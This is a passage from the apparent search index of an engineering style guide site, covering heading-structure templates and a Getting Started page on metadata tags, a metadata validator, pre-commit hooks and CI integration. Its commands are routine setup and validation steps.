</ul>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#document-type-templates","title":"Document Type Templates","text":"","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#language-guide-template","title":"Language Guide Template","text":"<p>Standard structure for all files in <code>docs/02_language_guides/</code>:</p> <pre><code>## Language Overview\n### Key Characteristics\n### This Style Guide Covers / Primary Use Cases\n\n## Quick Reference\n\n## Naming Conventions\n### [Specific elements like Variables, Functions, Classes, etc.]\n\n## Code Formatting / Configuration\n### [Language-specific formatting rules]\n\n## Documentation Standards\n### [Docstring/comment requirements]\n\n## Error Handling\n### [Exception patterns]\n\n## Testing Requirements / Testing Standards\n### [Testing patterns and requirements]\n\n## Security Best Practices\n### [Security requirements]\n\n## Recommended Tools / Tool Configuration\n### [Linters, formatters, etc.]\n\n## Complete Example / Examples\n### [Full working examples]\n\n## Anti-Patterns (optional)\n### [Common mistakes]\n\n## See Also\n### Related Language Guides\n### Development Tools &amp; Practices\n### Testing &amp; Quality\n### CI/CD Integration\n### Templates &amp; Examples\n### Core Documentation\n\n## References\n### [External links and resources]\n</code></pre>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#cicd-guide-template","title":"CI/CD Guide Template","text":"<p>Standard structure for files in <code>docs/05_ci_cd/</code>:</p> <pre><code>## Overview\n### What This Guide Covers\n### Related Documentation\n### [Optional: Workflow diagram]\n\n## Quick Start / Getting Started\n### Prerequisites\n### Basic Setup\n\n## Configuration\n### [Specific configuration sections]\n\n## Complete Examples / Pipelines\n### [Full working examples]\n\n## Advanced Patterns\n### [Complex use cases]\n\n## Security Best Practices\n### [Security requirements]\n\n## Performance Optimization (optional)\n### [Performance tips]\n\n## Troubleshooting\n### Common Issues\n### Debugging Tips\n\n## See Also\n### [Cross-references]\n\n## References\n### [External links]\n</code></pre>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#migration-guide-template","title":"Migration Guide Template","text":"<p>Standard structure for files in <code>docs/10_migration_guides/</code>:</p> <pre><code>## Overview\n### What This Guide Covers\n### Who Should Use This Guide\n\n## Quick Compatibility Summary\n### [Mermaid diagram]\n\n## What Stays the Same\n### [Tables showing compatible features]\n\n## What Changes: [Old] \u2192 [New]\n### [Numbered differences with descriptions]\n\n## Tool Configuration Migration\n### [From old tools to new tools]\n\n## Migration Checklist\n### Phase 1: [Phase name]\n### Phase 2: [Phase name]\n### [etc.]\n\n## Common Migration Pitfalls\n### [Numbered pitfalls with solutions]\n\n## Gradual Adoption Strategy\n### [Week-by-week or phase-by-phase plan]\n\n## Success Metrics\n### [Table of metrics]\n\n## Side-by-Side Comparison (optional)\n### [Comparison table]\n\n## Support and Resources\n### Documentation References\n### Tool Documentation\n### External References\n\n## Conclusion\n</code></pre>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#overviewprinciples-document-template","title":"Overview/Principles Document Template","text":"<p>Standard structure for files in <code>docs/01_overview/</code>:</p> <pre><code>## Overview / Introduction\n### [Context and purpose]\n\n## Core Principles / Key Concepts\n### [Principle 1]\n### [Principle 2]\n### [etc.]\n\n## [Main Content Sections]\n### [Subsections as needed]\n\n## Implementation / Application\n### [How to apply the principles]\n\n## Examples (optional)\n### [Practical examples]\n\n## See Also / Related Topics\n### [Cross-references]\n\n## References (optional)\n### [External links]\n</code></pre>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#template-document-template","title":"Template Document Template","text":"<p>Standard structure for files in <code>docs/04_templates/</code>:</p> <pre><code>## Overview\n### Purpose\n### When to Use This Template\n\n## Template Structure\n### [Sections of the template]\n\n## Usage Instructions\n### Step-by-Step Guide\n\n## Customization\n### [How to adapt the template]\n\n## Complete Template\n### [Full template code]\n\n## Examples\n### [Example usage]\n\n## See Also\n### [Related templates]\n\n## References (optional)\n### [External resources]\n</code></pre>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#example-document-template","title":"Example Document Template","text":"<p>Standard structure for files in <code>docs/05_examples/</code>:</p> <pre><code>## Overview\n### Purpose\n### What This Example Demonstrates\n\n## Prerequisites\n### Required Tools\n### Required Knowledge\n\n## Project Structure\n### [Directory layout]\n\n## Implementation\n### [Step-by-step implementation]\n\n## Testing\n### [How to test the example]\n\n## Deployment (if applicable)\n### [Deployment instructions]\n\n## See Also\n### [Related examples and guides]\n\n## References (optional)\n### [External resources]\n</code></pre>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#heading-naming-conventions","title":"Heading Naming Conventions","text":"","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#preferred-terms","title":"Preferred Terms","text":"<p>Use these standardized terms for consistency:</p> Concept Preferred Term Avoid Document purpose \"Overview\" \"Introduction\", \"About\" Getting started \"Quick Start\" or \"Getting Started\" \"Setup\", \"Intro\" Configuration \"Configuration\" \"Config\", \"Settings\" Code samples \"Examples\" \"Samples\", \"Code\", \"Demos\" Full implementations \"Complete Example\" \"Full Example\", \"Implementation\" Common mistakes \"Anti-Patterns\" \"Bad Practices\", \"Mistakes\" Common problems \"Common Pitfalls\" \"Gotchas\", \"Issues\" Problem solving \"Troubleshooting\" \"Debugging\", \"Problems\" Cross-references \"See Also\" \"Related\", \"Links\" External links \"References\" \"Resources\", \"Links\", \"Further Reading\" Best practices \"Best Practices\" \"Recommendations\", \"Guidelines\" Security \"Security Best Practices\" \"Security\", \"Secure Coding\" Performance \"Performance Optimization\" \"Optimization\", \"Performance\" Testing \"Testing Requirements\" or \"Testing Standards\" \"Tests\", \"Testing\"","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#action-oriented-headings","title":"Action-Oriented Headings","text":"<p>For procedural sections, use verb phrases:</p> <ul> <li>\u2705 \"Installing Dependencies\"</li> <li>\u2705 \"Configuring the Pipeline\"</li> <li>\u2705 \"Running Tests\"</li> <li>\u274c \"Dependency Installation\"</li> <li>\u274c \"Pipeline Configuration\"</li> <li>\u274c \"Test Execution\"</li> </ul>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#standardization-checklist","title":"Standardization Checklist","text":"<p>When standardizing a document:</p> <ul> <li>[ ] Verify frontmatter is complete and accurate</li> <li>[ ] Ensure no Level 1 headings in content (only in frontmatter title)</li> <li>[ ] Check all Level 2 headings use Title Case</li> <li>[ ] Check all Level 3+ headings use Sentence case</li> <li>[ ] Verify heading hierarchy is logical (no skipped levels)</li> <li>[ ] Use preferred terminology from naming conventions</li> <li>[ ] Include \"See Also\" section with proper cross-references</li> <li>[ ] Include \"References\" section if external links exist</li> <li>[ ] Ensure headings are searchable and keyword-rich</li> <li>[ ] Verify heading IDs don't conflict (for anchor links)</li> </ul>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#implementation-notes","title":"Implementation Notes","text":"","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#automated-checking","title":"Automated Checking","text":"<p>The following can be automated with linters:</p> <ul> <li>Heading level hierarchy (no skipped levels)</li> <li>Title case for Level 2 headings</li> <li>Maximum heading length</li> <li>No Level 1 headings in content</li> </ul>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#manual-review-required","title":"Manual Review Required","text":"<p>These aspects require human judgment:</p> <ul> <li>Logical grouping of content</li> <li>Appropriate section naming</li> <li>Cross-reference accuracy</li> <li>Consistency with similar documents</li> </ul>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#version-history","title":"Version History","text":"<ul> <li>v1.0.0 (2025-12-07): Initial heading structure standards</li> </ul>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"01_overview/getting_started/","title":"Getting Started","text":"<p>Welcome to the Dukes Engineering Style Guide! This guide will help you quickly adopt consistent coding standards, automated validation, and AI-friendly metadata across your projects.</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#what-is-this-style-guide","title":"What is This Style Guide?","text":"<p>The Dukes Engineering Style Guide is a comprehensive, multi-language coding standard that:</p> <ul> <li>Enforces consistency through automated tooling (linters, formatters, validators)</li> <li>Optimizes for AI with structured metadata that helps AI assistants understand your code</li> <li>Supports multiple languages (Python, Terraform, Bash, TypeScript, SQL, and more)</li> <li>Provides validation through pre-commit hooks, CI/CD pipelines, and containerized workflows</li> <li>Documents automatically using metadata tags for auto-generated documentation</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#who-should-use-this","title":"Who Should Use This?","text":"<p>This style guide is ideal for:</p> <ul> <li>DevOps Engineers working with infrastructure as code (Terraform, Ansible, Kubernetes)</li> <li>Software Engineers building APIs, services, and applications</li> <li>Teams looking for consistent coding standards across languages</li> <li>Projects that want to leverage AI assistants more effectively</li> <li>Organizations needing automated code quality enforcement</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#quick-start-5-minutes","title":"Quick Start (5 Minutes)","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#1-add-metadata-to-a-file","title":"1. Add Metadata to a File","text":"<p>Add metadata tags to your code files using language-appropriate comment syntax:</p> <p>Python Example:</p> <pre><code>\"\"\"\n@module user_authentication\n@description Handles user login, session management, and JWT token generation\n@version 1.0.0\n@author Your Name\n@last_updated 2025-10-28\n@dependencies fastapi, pyjwt\n@status stable\n\"\"\"\n\nimport jwt\nfrom fastapi import APIRouter\n\n## Your code here...\n</code></pre> <p>Terraform Example:</p> <pre><code>/**\n * @module vpc_networking\n * @description Creates AWS VPC with public/private subnets and NAT gateways\n * @version 2.0.0\n * @author Your Name\n * @last_updated 2025-10-28\n * @dependencies aws_vpc, aws_subnet, aws_nat_gateway\n * @status stable\n */\n\nresource \"aws_vpc\" \"main\" {\n  cidr_block = var.vpc_cidr\n  # Your configuration...\n}\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#2-validate-metadata","title":"2. Validate Metadata","text":"<p>Use the validator to check your metadata:</p> <pre><code>## Clone the repository\ngit clone https://github.com/tydukes/coding-style-guide.git\ncd coding-style-guide\n\n## Validate your files\npython3 scripts/validate_metadata.py /path/to/your/project\n\n## Or validate specific language files\npython3 scripts/validate_metadata.py --language python /path/to/your/src\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#3-set-up-pre-commit-hooks","title":"3. Set Up Pre-commit Hooks","text":"<p>Add automated validation to your repository:</p> <pre><code>## Install pre-commit\npip install pre-commit\n\n## Add .pre-commit-config.yaml to your repo\ncat &gt; .pre-commit-config.yaml &lt;&lt;EOF\nrepos:\n  - repo: https://github.com/psf/black\n    rev: 24.10.0\n    hooks:\n      - id: black\n  - repo: https://github.com/pycqa/flake8\n    rev: 7.1.1\n    hooks:\n      - id: flake8\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.96.1\n    hooks:\n      - id: terraform_fmt\n      - id: terraform_validate\n  - repo: local\n    hooks:\n      - id: validate-metadata\n        name: Validate Metadata\n        entry: python3 scripts/validate_metadata.py\n        language: python\n        files: \\.(py|tf|hcl|js|ts|sh|sql)$\nEOF\n\n## Install hooks\npre-commit install\n</code></pre> <p>That's it! Now your code will be validated automatically before every commit.</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#installation-options","title":"Installation Options","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#option-1-local-installation","title":"Option 1: Local Installation","text":"<p>Prerequisites:</p> <ul> <li>Python 3.8 or higher</li> <li>Git</li> </ul> <p>Steps:</p> <ol> <li>Clone the repository:</li> </ol> <pre><code>git clone https://github.com/tydukes/coding-style-guide.git\ncd coding-style-guide\n</code></pre> <ol> <li>Install Python dependencies:</li> </ol> <pre><code># Using uv (recommended)\npip install uv\nuv sync\n\n# Or using pip\npip install -r requirements.txt\n</code></pre> <ol> <li>Run the documentation server locally:</li> </ol> <pre><code>uv run mkdocs serve\n# Access at http://127.0.0.1:8000\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#option-2-container-based","title":"Option 2: Container-Based","text":"<p>Prerequisites:</p> <ul> <li>Docker</li> </ul> <p>Steps:</p> <ol> <li>Pull the pre-built container:</li> </ol> <pre><code>docker pull ghcr.io/tydukes/coding-style-guide:latest\n</code></pre> <ol> <li>Run validation on your project:</li> </ol> <pre><code>docker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest \\\n  validate /workspace\n</code></pre> <ol> <li>See available modes:</li> </ol> <pre><code>docker run --rm ghcr.io/tydukes/coding-style-guide:latest --help\n</code></pre> <p>Available Modes:    - <code>validate</code> - Full validation (metadata + linting)    - <code>lint</code> - Linting only    - <code>format</code> - Auto-format files    - <code>docs</code> - Build documentation    - <code>metadata</code> - Metadata validation only</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#option-3-github-actions-integration","title":"Option 3: GitHub Actions Integration","text":"<p>Add to your <code>.github/workflows/ci.yml</code>:</p> <pre><code>name: Code Quality\n\non: [push, pull_request]\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Validate Code Standards\n        uses: tydukes/coding-style-guide/.github/actions/validate@v1.0.0\n        with:\n          mode: validate  # validate, lint, format, docs, metadata\n          path: .\n          language: python  # Optional: python, terraform, bash, etc.\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#basic-workflow","title":"Basic Workflow","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#1-understanding-the-metadata-schema","title":"1. Understanding the Metadata Schema","text":"<p>All files should include metadata tags in their headers. The three required tags are:</p> <ul> <li><code>@module</code> - Unique identifier (lowercase with underscores or hyphens)</li> <li><code>@description</code> - Brief explanation of what the module does</li> <li><code>@version</code> - Semantic version (MAJOR.MINOR.PATCH)</li> </ul> <p>Recommended tags:</p> <ul> <li><code>@author</code> - Module creator</li> <li><code>@last_updated</code> - Date of last update (YYYY-MM-DD)</li> <li><code>@dependencies</code> - External dependencies</li> </ul> <p>Optional tags:</p> <ul> <li><code>@status</code> - Development status (draft, stable, deprecated, etc.)</li> <li><code>@security_classification</code> - Security level (public, internal, confidential)</li> <li><code>@api_endpoints</code> - API routes exposed</li> <li><code>@env</code> - Target environments (prod, staging, dev)</li> </ul> <p>See the Metadata Schema Reference for complete documentation.</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#2-adding-metadata-to-existing-code","title":"2. Adding Metadata to Existing Code","text":"<p>Step 1: Identify files without metadata</p> <pre><code>cd coding-style-guide\npython3 scripts/validate_metadata.py /path/to/your/project --output results.json\n</code></pre> <p>Step 2: Add minimal metadata</p> <p>Start with the three required tags:</p> <pre><code>\"\"\"\n@module [infer_from_filename]\n@description [TODO: Add description]\n@version 0.1.0\n\"\"\"\n</code></pre> <p>Step 3: Progressively enhance</p> <p>Add more tags as you go:</p> <pre><code>\"\"\"\n@module user_service\n@description Handles user account creation, authentication, and profile management\n@version 1.0.0\n@author Your Name\n@last_updated 2025-10-28\n@dependencies fastapi, sqlalchemy, pydantic\n@status stable\n\"\"\"\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#3-running-validation","title":"3. Running Validation","text":"<p>Validate all files:</p> <pre><code>python3 scripts/validate_metadata.py /path/to/project\n</code></pre> <p>Validate specific language:</p> <pre><code>python3 scripts/validate_metadata.py --language python src/\npython3 scripts/validate_metadata.py --language terraform infrastructure/\n</code></pre> <p>Strict mode (warnings treated as errors):</p> <pre><code>python3 scripts/validate_metadata.py --strict /path/to/project\n</code></pre> <p>Export results to JSON:</p> <pre><code>python3 scripts/validate_metadata.py --output validation_results.json /path/to/project\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#4-setting-up-language-specific-tools","title":"4. Setting Up Language-Specific Tools","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#python","title":"Python","text":"<pre><code>## Install tools\npip install black flake8 mypy\n\n## Add to .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/psf/black\n    rev: 24.10.0\n    hooks:\n      - id: black\n  - repo: https://github.com/pycqa/flake8\n    rev: 7.1.1\n    hooks:\n      - id: flake8\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#terraform","title":"Terraform","text":"<pre><code>## Install terraform and tflint\nbrew install terraform tflint\n\n## Add to .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.96.1\n    hooks:\n      - id: terraform_fmt\n      - id: terraform_validate\n      - id: terraform_docs\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#bash","title":"Bash","text":"<pre><code>## Install shellcheck\nbrew install shellcheck\n\n## Add to .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/shellcheck-py/shellcheck-py\n    rev: v0.10.0.1\n    hooks:\n      - id: shellcheck\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#typescript","title":"TypeScript","text":"<pre><code>## Install tools\nnpm install --save-dev prettier eslint @typescript-eslint/parser\n\n## Add to .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/pre-commit/mirrors-prettier\n    rev: v4.0.0-alpha.8\n    hooks:\n      - id: prettier\n        types_or: [javascript, jsx, ts, tsx]\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#common-use-cases","title":"Common Use Cases","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#use-case-1-new-project-setup","title":"Use Case 1: New Project Setup","text":"<p>Goal: Start a new project with the style guide from day one.</p> <p>Steps:</p> <ol> <li>Initialize your repository:</li> </ol> <pre><code>mkdir my-new-project\ncd my-new-project\ngit init\n</code></pre> <ol> <li>Copy the style guide configuration:</li> </ol> <pre><code># Copy pre-commit config\ncurl -o .pre-commit-config.yaml \\\n  https://raw.githubusercontent.com/tydukes/coding-style-guide/main/.pre-commit-config.yaml\n\n# Install pre-commit\npip install pre-commit\npre-commit install\n</code></pre> <ol> <li>Add metadata to your first file:</li> </ol> <pre><code>\"\"\"\n@module main\n@description Application entry point\n@version 0.1.0\n@author Your Name\n@last_updated 2025-10-28\n\"\"\"\n\ndef main():\n    print(\"Hello, World!\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <ol> <li>Commit and validate:</li> </ol> <pre><code>git add .\ngit commit -m \"feat: initial project setup with style guide\"\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#use-case-2-migrating-existing-project","title":"Use Case 2: Migrating Existing Project","text":"<p>Goal: Add the style guide to an existing codebase.</p> <p>Steps:</p> <ol> <li>Run validation to see current state:</li> </ol> <pre><code>python3 /path/to/coding-style-guide/scripts/validate_metadata.py . --output baseline.json\n</code></pre> <ol> <li>Create a migration plan:</li> </ol> <pre><code># Count files needing metadata\njq '.errors | length' baseline.json\n\n# Identify most critical files (entry points, APIs, core modules)\n</code></pre> <ol> <li> <p>Add metadata incrementally:</p> </li> <li> <p>Start with core modules (entry points, main services)</p> </li> <li>Move to API endpoints and business logic</li> <li> <p>Finally, utilities and helpers</p> </li> <li> <p>Set up pre-commit hooks:</p> </li> </ol> <pre><code>pip install pre-commit\n# Copy .pre-commit-config.yaml from style guide\npre-commit install\n</code></pre> <ol> <li>Track progress:</li> </ol> <pre><code># Re-run validation periodically\npython3 scripts/validate_metadata.py . --output progress.json\n\n# Compare error counts\ndiff baseline.json progress.json\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#use-case-3-cicd-integration","title":"Use Case 3: CI/CD Integration","text":"<p>Goal: Enforce standards in your CI/CD pipeline.</p> <p>GitHub Actions:</p> <pre><code>## .github/workflows/ci.yml\nname: Code Quality\n\non: [push, pull_request]\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n\n      - name: Install dependencies\n        run: |\n          pip install black flake8 mypy\n          pip install pre-commit\n\n      - name: Run pre-commit\n        run: pre-commit run --all-files\n\n      - name: Validate metadata\n        run: |\n          git clone https://github.com/tydukes/coding-style-guide.git\n          python3 coding-style-guide/scripts/validate_metadata.py . --strict\n</code></pre> <p>GitLab CI:</p> <pre><code>## .gitlab-ci.yml\nvalidate:\n  image: ghcr.io/tydukes/coding-style-guide:latest\n  script:\n    - validate /builds/$CI_PROJECT_PATH\n  only:\n    - merge_requests\n    - main\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#use-case-4-team-onboarding","title":"Use Case 4: Team Onboarding","text":"<p>Goal: Help new team members adopt the style guide.</p> <p>Onboarding Checklist:</p> <pre><code>## Style Guide Onboarding\n\n- [ ] Read [Core Principles](principles.md)\n- [ ] Install pre-commit hooks: `pre-commit install`\n- [ ] Review language-specific guide for your primary language\n- [ ] Add metadata to at least one file\n- [ ] Run validation: `python3 scripts/validate_metadata.py /path/to/your/file`\n- [ ] Make a commit and verify pre-commit hooks run\n- [ ] Review [Metadata Schema Reference](../03_metadata_schema/schema_reference.md)\n</code></pre> <p>Team Training Session Outline:</p> <ol> <li>Introduction (10 min): Why we use a style guide</li> <li>Core Concepts (15 min): Metadata schema, automation, AI optimization</li> <li>Hands-on Practice (20 min): Add metadata to real code files</li> <li>Validation (10 min): Run validators and fix issues</li> <li>Q&amp;A (5 min): Common questions and troubleshooting</li> </ol>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#troubleshooting","title":"Troubleshooting","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#issue-pre-commit-hooks-failing","title":"Issue: Pre-commit Hooks Failing","text":"<p>Symptom: Commit blocked with \"black\" or \"flake8\" errors</p> <p>Solution:</p> <pre><code>## Run black to auto-format\nblack .\n\n## Check flake8 errors\nflake8 .\n\n## Fix errors and try again\ngit add .\ngit commit -m \"fix: address linting issues\"\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#issue-metadata-validation-failing","title":"Issue: Metadata Validation Failing","text":"<p>Symptom: <code>validate_metadata.py</code> reports missing or invalid tags</p> <p>Solution:</p> <pre><code>## Check which files are failing\npython3 scripts/validate_metadata.py . --output errors.json\ncat errors.json | jq '.errors'\n\n## Add missing tags\n## Fix version format (use MAJOR.MINOR.PATCH)\n## Fix date format (use YYYY-MM-DD)\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#issue-duplicate-module-names","title":"Issue: Duplicate Module Names","text":"<p>Symptom: Validator reports \"Duplicate module name\"</p> <p>Solution:</p> <pre><code>## Find duplicates\ngrep -r \"@module your_module_name\" .\n\n## Rename one of the modules to be unique\n## Module names should describe the specific purpose\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#issue-container-permission-denied","title":"Issue: Container Permission Denied","text":"<p>Symptom: Docker container can't write to mounted volume</p> <p>Solution:</p> <pre><code>## Run with user permissions\ndocker run --rm -v $(pwd):/workspace \\\n  --user $(id -u):$(id -g) \\\n  ghcr.io/tydukes/coding-style-guide:latest \\\n  validate /workspace\n</code></pre>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#next-steps","title":"Next Steps","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#1-explore-language-guides","title":"1. Explore Language Guides","text":"<p>Pick the language guide relevant to your work:</p> <ul> <li>Python Style Guide</li> <li>Terraform Style Guide</li> <li>Bash Style Guide</li> <li>TypeScript Style Guide</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#2-review-advanced-topics","title":"2. Review Advanced Topics","text":"<ul> <li>Metadata Schema Reference - Complete tag documentation</li> <li>Governance Model - Branching, PRs, and release processes</li> <li>Repository Structure - Monorepo vs multi-repo patterns</li> <li>CI/CD Patterns - Advanced pipeline integration</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#3-integrate-with-your-workflow","title":"3. Integrate with Your Workflow","text":"<ul> <li>Add GitHub Actions or GitLab CI validation</li> <li>Set up automated documentation generation</li> <li>Configure IDE extensions for real-time validation</li> <li>Create team-specific customizations</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#4-contribute-back","title":"4. Contribute Back","text":"<p>Found something missing or incorrect?</p> <ol> <li>Open an issue: GitHub Issues</li> <li>Submit a pull request: Contributing Guide</li> </ol>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#see-also","title":"See Also","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#core-documentation","title":"Core Documentation","text":"<ul> <li>Principles - Style guide philosophy and core values</li> <li>Governance - Decision-making and contribution process</li> <li>Structure - Repository organization patterns</li> <li>Metadata Schema - Frontmatter requirements</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#popular-language-guides","title":"Popular Language Guides","text":"<ul> <li>Python Style Guide - Python development standards</li> <li>TypeScript Style Guide - TypeScript development standards</li> <li>Terraform Style Guide - Infrastructure as Code standards</li> <li>Bash Style Guide - Shell scripting standards</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#development-setup","title":"Development Setup","text":"<ul> <li>IDE Integration Guide - Editor setup for validation</li> <li>Pre-commit Hooks Guide - Local validation hooks</li> <li>Local Validation Setup - Development environment</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#cicd-integration","title":"CI/CD Integration","text":"<ul> <li>GitHub Actions Guide - GitHub workflow examples</li> <li>GitLab CI Guide - GitLab pipeline examples</li> <li>Jenkins Pipeline Guide - Jenkins configuration</li> <li>AI Validation Pipeline - Automated code review</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#templates-examples","title":"Templates &amp; Examples","text":"<ul> <li>README Template - Project documentation</li> <li>Python Package Template - Python project structure</li> <li>Terraform Module Template - Terraform module structure</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#container-usage","title":"Container Usage","text":"<ul> <li>Container Usage Guide - Docker-based validation</li> <li>Integration Guide - Integrate into your projects</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#resources","title":"Resources","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#documentation","title":"Documentation","text":"<ul> <li>Full Documentation Site</li> <li>GitHub Repository</li> <li>Changelog</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#tools","title":"Tools","text":"<ul> <li>Metadata Validator</li> <li>GitHub Action</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#community","title":"Community","text":"<ul> <li>Code of Conduct</li> <li>Contributing Guidelines</li> <li>Security Policy</li> </ul>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#frequently-asked-questions","title":"Frequently Asked Questions","text":"","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#q-do-i-need-to-add-metadata-to-every-file","title":"Q: Do I need to add metadata to every file?","text":"<p>A: Yes, all code modules should have metadata. However, you can migrate incrementally - start with core modules and expand over time.</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#q-can-i-customize-the-metadata-schema","title":"Q: Can I customize the metadata schema?","text":"<p>A: Yes! The schema is extensible. You can add custom tags for your organization's needs. Just document them and update your validation scripts.</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#q-what-if-my-language-isnt-supported","title":"Q: What if my language isn't supported?","text":"<p>A: The metadata schema is language-agnostic. Use the appropriate comment syntax for your language and follow the same tag format. You can also contribute a new language guide!</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#q-do-i-need-to-use-all-the-tools-black-flake8-etc","title":"Q: Do I need to use all the tools (Black, Flake8, etc.)?","text":"<p>A: No, pick the tools that make sense for your project. At minimum, we recommend using the metadata validator and formatters for your primary languages.</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#q-how-do-i-handle-legacy-code","title":"Q: How do I handle legacy code?","text":"<p>A: Add metadata as you touch files. Use the <code>@status deprecated</code> tag for code that's being phased out. Consider creating a migration plan to add metadata incrementally.</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/getting_started/#q-can-i-use-this-with-monorepos","title":"Q: Can I use this with monorepos?","text":"<p>A: Absolutely! The style guide works great with monorepos. See the Repository Structure guide for monorepo-specific patterns.</p> <p>Ready to get started? Choose your path:</p> <ul> 